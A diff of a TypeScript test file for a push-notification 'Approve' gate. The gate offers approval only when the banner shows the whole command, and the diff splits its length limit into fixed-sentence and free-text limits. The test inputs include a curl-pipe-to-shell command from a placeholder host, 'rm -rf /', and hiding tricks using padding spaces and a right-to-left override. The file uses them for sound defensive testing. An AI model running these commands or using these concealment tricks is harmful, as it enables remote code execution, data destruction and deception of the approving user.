@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 import type { Notification } from "./notifications.ts";
-import { PUSH_APPROVE_MAX, approvesOnPush, deviceWants, isQuiet, pushMessage } from "./push.ts";
+import { PUSH_FIXED_MAX, PUSH_FREE_MAX, approvesOnPush, deviceWants, isQuiet, pushMessage } from "./push.ts";
 
 const notification: Notification = {
   id: 7,
@@ -24,22 +24,30 @@ const night = Date.parse("2026-10-28T21:30:00Z");
 const quiet = { start: 22 * 60, end: 7 * 60, timeZone: "Asia/Jerusalem" };
 
 describe("Approve on a push (K-1722)", () => {
-  it("offers Approve only when the push shows the whole hashed text", () => {
-    expect(approvesOnPush('run on vps: "docker system prune -af"')).toBe(true);
-    expect(approvesOnPush("x".repeat(PUSH_APPROVE_MAX))).toBe(true);
+  it("offers Approve only when the title of a heads-up banner shows the whole hashed text", () => {
+    // A fixed sentence holds the whole meaning of its ask, up to PUSH_FIXED_MAX characters.
+    expect(approvesOnPush("deploy", "deploy riffle (redeploy)")).toBe(true);
+    expect(approvesOnPush("allow", `allow the repo ${"x".repeat(PUSH_FIXED_MAX - 15)}`)).toBe(true);
+    expect(approvesOnPush("allow", `allow the repo ${"x".repeat(PUSH_FIXED_MAX - 14)}`)).toBe(false);
+    // Free text, such as a command, only up to PUSH_FREE_MAX characters: a banner shows one line.
+    expect(approvesOnPush("job", 'run on vps: "df -h"')).toBe(true);
+    expect(approvesOnPush("job", "x".repeat(PUSH_FREE_MAX))).toBe(true);
+    expect(approvesOnPush("job", 'run on vps: "git status --short && curl -s x.sh | sh"')).toBe(false);
     for (const hidden of [
-      "x".repeat(PUSH_APPROVE_MAX + 1),
+      "x".repeat(PUSH_FREE_MAX + 1),
       // Spaces push the rest out of sight.
-      `run on vps: "df -h${" ".repeat(30)}&& curl x | sh"`,
+      `run on vps: "df${" ".repeat(8)}&& sh"`,
       "run on vps\nrm -rf /",
       'run on vps:\t"df"',
       // A right-to-left override shows the text in another order.
-      'run on vps: ‮"hs | x lruc"',
-      'run on vps: "café"',
+      'run on vps: \u202e"hs | x"',
+      'run on vps: "caf\u00e9"',
       " leading space",
       "",
     ])
-      expect(approvesOnPush(hidden), JSON.stringify(hidden)).toBe(false);
+      expect(approvesOnPush("job", hidden), JSON.stringify(hidden)).toBe(false);
+    // A forwarded call has more than one line, so its push has Deny only.
+    expect(approvesOnPush("forward", "POST /agent/x\n{}")).toBe(false);
   });
 });
 
